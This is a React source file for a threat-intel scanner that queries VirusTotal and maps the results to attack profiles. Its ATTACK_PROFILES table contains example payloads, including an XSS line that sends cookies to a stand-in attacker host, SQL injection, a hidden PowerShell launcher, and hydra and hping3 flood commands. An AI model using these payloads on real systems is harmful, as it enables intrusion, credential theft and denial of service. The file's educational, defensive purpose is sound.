import { useState, useCallback, useRef } from 'react';
import { useAuth } from '@/contexts/AuthContext';
import { useTranslation } from 'react-i18next';
import { motion, AnimatePresence } from 'framer-motion';
import { Globe, Mail, Upload, Loader2, Crosshair, ShieldAlert, Skull, Bug, Zap, ChevronDown, ChevronUp } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Progress } from '@/components/ui/progress';
import { Badge } from '@/components/ui/badge';
import { supabase } from '@/integrations/supabase/client';
import { useToast } from '@/hooks/use-toast';

type AttackVector =
  | 'xss' | 'sqli' | 'csrf' | 'phishing' | 'malware' | 'mitm'
  | 'ddos' | 'brute_force' | 'credential_stuffing' | 'drive_by'
  | 'clickjacking' | 'dns_spoofing';

interface AttackProfile {
  name: string;
  short: string;
  exploit: string;
  payload: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  keywords: string[];
}

const ATTACK_PROFILES: Record<AttackVector, AttackProfile> = {
  xss: {
    name: 'Cross-Site Scripting (XSS)',
    short: 'Inject client-side scripts into trusted pages',
    exploit: 'Hijack session cookies, deface the DOM, or pivot to internal admin panels via stored/reflected payloads.',
    payload: '<script>fetch("//attacker.tld/?c="+document.cookie)</script>',
    severity: 'critical',
    keywords: ['xss', 'script', 'cross-site', 'reflected', 'stored'],
  },
  sqli: {
    name: 'SQL Injection',
    short: 'Inject SQL via unsanitised inputs',
    exploit: 'Dump entire user tables, bypass auth (`OR 1=1`), or escalate to RCE via xp_cmdshell / UDFs.',
    payload: "' UNION SELECT username, password FROM users--",
    severity: 'critical',
    keywords: ['sql', 'sqli', 'injection', 'union', 'database'],
  },
  csrf: {
    name: 'Cross-Site Request Forgery',
    short: 'Force authenticated users to perform unwanted actions',
    exploit: 'Trigger state-changing requests using the victim’s active session — money transfers, password resets, role changes.',
    payload: '<img src="https://bank.tld/transfer?to=attacker&amt=9999">',
    severity: 'high',
    keywords: ['csrf', 'forgery', 'samesite'],
  },
  phishing: {
    name: 'Phishing / Credential Harvest',
    short: 'Impersonate trusted brands to steal credentials',
    exploit: 'Clone the login page, register a typosquat domain (g00gle.com), and pipe POSTed creds to a Telegram bot.',
    payload: 'https://login-microsoft-secure.tld/auth?redirect=...',
    severity: 'high',
    keywords: ['phish', 'credential', 'login', 'fake', 'deceptive', 'social'],
  },
  malware: {
    name: 'Malware / Trojan Dropper',
    short: 'Deliver and execute hostile binaries',
    exploit: 'Bundle a packed PE inside a macro-laced .docm; on open it stages a Cobalt Strike beacon over HTTPS.',
    payload: 'powershell -nop -w hidden -enc <base64-payload>',
    severity: 'critical',
    keywords: ['malware', 'trojan', 'ransomware', 'backdoor', 'worm', 'virus', 'rootkit', 'dropper', 'payload'],
  },
  mitm: {
    name: 'Man-in-the-Middle (MITM)',
    short: 'Intercept and tamper with traffic in transit',
    exploit: 'ARP-spoof a LAN, strip HTTPS via sslstrip2, or abuse stale HSTS to steal auth tokens.',
    payload: 'bettercap -iface eth0 -caplet http-req-dump',
    severity: 'high',
    keywords: ['mitm', 'man-in-the-middle', 'intercept', 'sslstrip', 'arp'],
  },
  ddos: {
    name: 'DDoS / Resource Exhaustion',
    short: 'Overwhelm the target with traffic',
    exploit: 'Amplify via open DNS resolvers (54x) or exhaust app-layer with slow POST + Range header floods.',
    payload: 'hping3 -S --flood -p 443 target.tld',
    severity: 'high',
    keywords: ['ddos', 'dos', 'flood', 'amplification', 'botnet'],
  },
  brute_force: {
    name: 'Brute Force',
    short: 'Try every credential until one works',
    exploit: 'Spray top-1000 passwords against /login with low concurrency to dodge lockouts.',
    payload: 'hydra -L users.txt -P rockyou.txt target.tld http-post-form',
    severity: 'medium',
    keywords: ['brute', 'force', 'guess', 'dictionary'],
  },
  credential_stuffing: {
    name: 'Credential Stuffing',
    short: 'Replay leaked credentials across sites',
    exploit: 'Feed Combo lists from past breaches into headless Chrome via Puppeteer to validate live accounts.',
    payload: 'shuffle combo.txt | xargs -P 50 ./check_login.py',
    severity: 'high',
    keywords: ['stuffing', 'breach', 'leaked', 'combo', 'reuse'],
  },
  drive_by: {
    name: 'Drive-by Download',
    short: 'Silent malware install via exploit kit',
    exploit: 'Embed a hostile iframe that fingerprints the browser and serves an n-day Chrome RCE chain.',
    payload: '<iframe src="https://exploit.kit/payload" style="display:none"></iframe>',
    severity: 'critical',
    keywords: ['drive-by', 'driveby', 'exploit kit', 'iframe', 'malicious site', 'malsite', 'harmful'],
  },
  clickjacking: {
    name: 'Clickjacking / UI Redress',
    short: 'Trick users into clicking invisible elements',
    exploit: 'Frame the target inside a transparent overlay so a “Play” button actually triggers /delete-account.',
    payload: '<iframe src="//victim.tld" style="opacity:0;position:absolute;top:0"></iframe>',
    severity: 'medium',
    keywords: ['clickjack', 'ui redress', 'x-frame', 'iframe'],
  },
  dns_spoofing: {
    name: 'DNS Spoofing / Cache Poison',
    short: 'Redirect resolution to attacker-controlled IPs',
    exploit: 'Poison the resolver cache with a forged A record so victims land on a cloned banking portal.',
    payload: 'dig @resolver.tld bank.tld  →  A 198.51.100.66 (forged)',
    severity: 'high',
    keywords: ['dns', 'spoof', 'cache', 'poison', 'dkim', 'spf', 'dmarc', 'forged', 'impersonat'],
  },
};

const SEVERITY_STYLE: Record<AttackProfile['severity'], string> = {
  low: 'bg-primary/15 text-primary border-primary/30',
  medium: 'bg-accent/15 text-accent border-accent/30',
  high: 'bg-orange-500/15 text-orange-500 border-orange-500/30',
  critical: 'bg-destructive/15 text-destructive border-destructive/30',
};

interface VTStats { malicious: number; suspicious: number; undetected: number; harmless: number; timeout: number; }

async function callProxy(body: Record<string, string>) {
  const { data, error } = await supabase.functions.invoke('virustotal-proxy', { body });
  if (error) throw new Error(error.message || 'Proxy call failed');
  return data;
}

async function pollAnalysis(analysisId: string, maxAttempts = 15): Promise<any> {
  for (let i = 0; i < maxAttempts; i++) {
    const data = await callProxy({ action: 'get-analysis', analysisId });
    if (data?.data?.attributes?.status === 'completed') return data;
    await new Promise(r => setTimeout(r, 3000));
  }
  throw new Error('Analysis timed out');
}

async function computeSHA256(file: File): Promise<string> {
  const buf = await file.arrayBuffer();
  const hash = await crypto.subtle.digest('SHA-256', buf);
  return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
}

function classifyAttackVectors(detections: string[], stats: VTStats): { vector: AttackVector; score: number }[] {
  const text = detections.join(' ').toLowerCase();
  const scores: Partial<Record<AttackVector, number>> = {};

  (Object.keys(ATTACK_PROFILES) as AttackVector[]).forEach(v => {
    let s = 0;
    for (const kw of ATTACK_PROFILES[v].keywords) {
      const m = text.match(new RegExp(kw, 'gi'));
      if (m) s += m.length;
    }
    if (s > 0) scores[v] = s;
  });

  // If keyword matching produced nothing (common for clean targets or really
  // short detection strings), we still want *something* on the page — so we
  // seed a few vectors based on how the VT verdict looks overall.
  if (Object.keys(scores).length === 0) {
    if (stats.malicious >= 5) {
      scores.malware = 3; scores.drive_by = 2; scores.phishing = 1;
    } else if (stats.malicious + stats.suspicious >= 1) {
      scores.phishing = 2; scores.xss = 1;
    } else {
      // Clean target: show the three most universal web-app surfaces so the
      // user learns what to defend against even when nothing is wrong today.
      scores.xss = 1; scores.csrf = 1; scores.clickjacking = 1;
    }
  }

  return Object.entries(scores)
    .map(([vector, score]) => ({ vector: vector as AttackVector, score: score as number }))
    .sort((a, b) => b.score - a.score);
}

const VanguardScanner = () => {
  const { t } = useTranslation();
  const { toast } = useToast();
  const { user } = useAuth();
  const [isScanning, setIsScanning] = useState(false);
  const [progress, setProgress] = useState(0);
  const [url, setUrl] = useState('');
  const [emailHeaders, setEmailHeaders] = useState('');
  const [target, setTarget] = useState('');
  const [stats, setStats] = useState<VTStats | null>(null);
  const [vectors, setVectors] = useState<{ vector: AttackVector; score: number }[]>([]);
  const [expanded, setExpanded] = useState<AttackVector | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const progressTimer = useRef<ReturnType<typeof setInterval> | null>(null);

  const start = () => {
    setIsScanning(true);
    setVectors([]);
    setStats(null);
    setExpanded(null);
    setProgress(0);
    progressTimer.current = setInterval(() => {
      setProgress(p => (p >= 90 ? p : p + Math.random() * 6 + 1));
    }, 500);
  };

  const stop = () => {
    if (progressTimer.current) clearInterval(progressTimer.current);
    setProgress(100);
    setIsScanning(false);
  };

  const finalize = (engineDetections: string[], s: VTStats, label: string, scanType: string) => {
    setStats(s);
    setTarget(label);
    const v = classifyAttackVectors(engineDetections, s);
    setVectors(v);
    if (user) {
      const detected = s.malicious + s.suspicious;
      const total = s.malicious + s.suspicious + s.undetected + s.harmless + s.timeout;
      const verdict = s.malicious >= 5 ? 'malicious' : detected >= 1 ? 'suspicious' : 'safe';
      supabase.from('scan_history').insert({
        user_id: user.id,
        scan_type: scanType,
        target: label,
        verdict,
        detected,
        total_engines: total,
        stats: s as any,
      }).then(() => {});
    }
  };

  const extractDetections = (results: Record<string, any> | undefined): string[] => {
    if (!results) return [];
    return Object.values(results)
      .filter((r: any) => r.category === 'malicious' || r.category === 'suspicious')
      .map((r: any) => r.result || '')
      .filter(Boolean);
  };

  const scanUrl = useCallback(async () => {
    if (!url) return;
    start();
    try {
      const submit = await callProxy({ action: 'scan-url', url });
      if (!submit.analysisId) throw new Error('No analysis ID');
      const result = await pollAnalysis(submit.analysisId);
      const attrs = result.data.attributes;
      finalize(extractDetections(attrs.results), attrs.stats, url, 'vanguard-url');
    } catch (e: any) {
      toast({ title: 'Recon failed', description: e.message, variant: 'destructive' });
    } finally {
      stop();
    }
  }, [url, user]);

  const scanFile = useCallback(async (file: File) => {
    start();
    try {
      const hash = await computeSHA256(file);
      const result = await callProxy({ action: 'scan-file', hash });
      if (result.meta?.not_found) {
        finalize([], { malicious: 0, suspicious: 0, undetected: 0, harmless: 0, timeout: 0 }, file.name, 'vanguard-file');
        toast({ title: 'Unknown sample', description: 'No prior intel — surfaces shown are theoretical.' });
        return;
      }
      const attrs = result.data.attributes;
      finalize(extractDetections(attrs.last_analysis_results), attrs.last_analysis_stats, file.name, 'vanguard-file');
    } catch (e: any) {
      toast({ title: 'Recon failed', description: e.message, variant: 'destructive' });
    } finally {
      stop();
    }
  }, [user]);

  const scanEmail = useCallback(async () => {
    const m = emailHeaders.match(/https?:\/\/[^\s<>"]+/);
    if (!m) {
      toast({ title: 'No URL found', description: 'Paste headers containing at least one URL.', variant: 'destructive' });
      return;
    }
    start();
    try {
      const submit = await callProxy({ action: 'scan-url', url: m[0] });
      if (!submit.analysisId) throw new Error('No analysis ID');
      const result = await pollAnalysis(submit.analysisId);
      const attrs = result.data.attributes;
      finalize(extractDetections(attrs.results), attrs.stats, m[0], 'vanguard-email');
    } catch (e: any) {
      toast({ title: 'Recon failed', description: e.message, variant: 'destructive' });
    } finally {
      stop();
    }
  }, [emailHeaders, user]);

  return (
    <div className="space-y-8">
      <Tabs defaultValue="url" className="w-full">
        <TabsList className="grid w-full grid-cols-3 max-w-md mx-auto">
          <TabsTrigger value="url" className="gap-2"><Globe className="w-4 h-4" />URL</TabsTrigger>
          <TabsTrigger value="file" className="gap-2"><Upload className="w-4 h-4" />File</TabsTrigger>
          <TabsTrigger value="email" className="gap-2"><Mail className="w-4 h-4" />Email</TabsTrigger>
        </TabsList>

        <TabsContent value="url" className="mt-6">
          <div className="glass p-6 rounded-xl border border-border space-y-4">
            <input
              type="url"
              value={url}
              onChange={e => setUrl(e.target.value)}
              placeholder="https://target.tld"
              className="w-full bg-muted/30 border border-border rounded-lg px-4 py-3 text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-accent"
            />
            <Button onClick={scanUrl} disabled={isScanning || !url} className="w-full gap-2">
              <Crosshair className="w-4 h-4" /> Map Attack Surface
            </Button>
          </div>
        </TabsContent>

        <TabsContent value="file" className="mt-6">
          <div
            onClick={() => fileInputRef.current?.click()}
            className="glass p-10 rounded-xl border-2 border-dashed border-border hover:border-accent text-center cursor-pointer transition-colors"
          >
            <Upload className="w-10 h-10 text-accent mx-auto mb-3" />
            <p className="text-foreground font-medium">Drop a sample to profile</p>
            <p className="text-sm text-muted-foreground">SHA-256 hash is sent to threat intel — file never leaves your browser</p>
            <input
              ref={fileInputRef}
              type="file"
              className="hidden"
              onChange={e => { const f = e.target.files?.[0]; if (f) scanFile(f); }}
            />
          </div>
        </TabsContent>

        <TabsContent value="email" className="mt-6">
          <div className="glass p-6 rounded-xl border border-border space-y-4">
            <textarea
              value={emailHeaders}
              onChange={e => setEmailHeaders(e.target.value)}
              placeholder="Paste full email headers including any embedded URLs..."
              rows={6}
              className="w-full bg-muted/30 border border-border rounded-lg px-4 py-3 text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-accent font-mono text-sm"
            />
            <Button onClick={scanEmail} disabled={isScanning || !emailHeaders} className="w-full gap-2">
              <Crosshair className="w-4 h-4" /> Profile Sender
            </Button>
          </div>
        </TabsContent>
      </Tabs>

      {isScanning && (
        <div className="glass p-6 rounded-xl border border-border">
          <div className="flex items-center gap-3 mb-3">
            <Loader2 className="w-5 h-5 text-accent animate-spin" />
            <span className="text-foreground">Profiling attack surface…</span>
          </div>
          <Progress value={progress} className="h-2" />
        </div>
      )}

      <AnimatePresence>
        {vectors.length > 0 && !isScanning && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-4"
          >
            <div className="glass p-5 rounded-xl border border-border">
              <div className="flex items-center gap-3 mb-2">
                <ShieldAlert className="w-6 h-6 text-accent" />
                <div>
                  <h3 className="text-foreground font-bold">Attack Surface Report</h3>
                  <p className="text-sm text-muted-foreground break-all">{target}</p>
                </div>
              </div>
              {stats && (
                <div className="flex flex-wrap gap-2 text-xs">
                  <Badge variant="outline" className="bg-destructive/10 text-destructive border-destructive/30">
                    {stats.malicious} malicious
                  </Badge>
                  <Badge variant="outline" className="bg-orange-500/10 text-orange-500 border-orange-500/30">
                    {stats.suspicious} suspicious
                  </Badge>
                  <Badge variant="outline" className="bg-primary/10 text-primary border-primary/30">
                    {stats.harmless + stats.undetected} clean
                  </Badge>
                </div>
              )}
            </div>

            <div className="grid gap-3">
              {vectors.map(({ vector, score }) => {
                const p = ATTACK_PROFILES[vector];
                const isOpen = expanded === vector;
                return (
                  <motion.div
                    key={vector}
                    layout
                    className="glass rounded-xl border border-border overflow-hidden"
                  >
                    <button
                      onClick={() => setExpanded(isOpen ? null : vector)}
                      className="w-full flex items-center gap-3 p-4 hover:bg-muted/30 transition-colors text-start"
                    >
                      <Skull className="w-5 h-5 text-accent shrink-0" />
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 flex-wrap">
                          <span className="font-semibold text-foreground">{p.name}</span>
                          <Badge variant="outline" className={`${SEVERITY_STYLE[p.severity]} capitalize text-xs`}>
                            {p.severity}
                          </Badge>
                          <Badge variant="outline" className="text-xs">match: {score}</Badge>
                        </div>
                        <p className="text-sm text-muted-foreground mt-0.5">{p.short}</p>
                      </div>
                      {isOpen ? <ChevronUp className="w-4 h-4 text-muted-foreground" /> : <ChevronDown className="w-4 h-4 text-muted-foreground" />}
                    </button>

                    <AnimatePresence>
                      {isOpen && (
                        <motion.div
                          initial={{ height: 0, opacity: 0 }}
                          animate={{ height: 'auto', opacity: 1 }}
                          exit={{ height: 0, opacity: 0 }}
                          className="border-t border-border"
                        >
                          <div className="p-4 space-y-3 bg-muted/10">
                            <div>
                              <div className="flex items-center gap-2 text-xs uppercase text-muted-foreground mb-1">
                                <Bug className="w-3 h-3" /> Exploit path
                              </div>
                              <p className="text-sm text-foreground">{p.exploit}</p>
                            </div>
                            <div>
                              <div className="flex items-center gap-2 text-xs uppercase text-muted-foreground mb-1">
                                <Zap className="w-3 h-3" /> Example payload
                              </div>
                              <pre className="text-xs bg-background/60 border border-border rounded-md p-3 overflow-x-auto text-accent font-mono">
{p.payload}
                              </pre>
                            </div>
                            <p className="text-[11px] text-muted-foreground italic">
                              For authorised testing only. Reproducing payloads against systems you don’t own is illegal.
                            </p>
                          </div>
                        </motion.div>
                      )}
                    </AnimatePresence>
                  </motion.div>
                );
              })}
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default VanguardScanner;
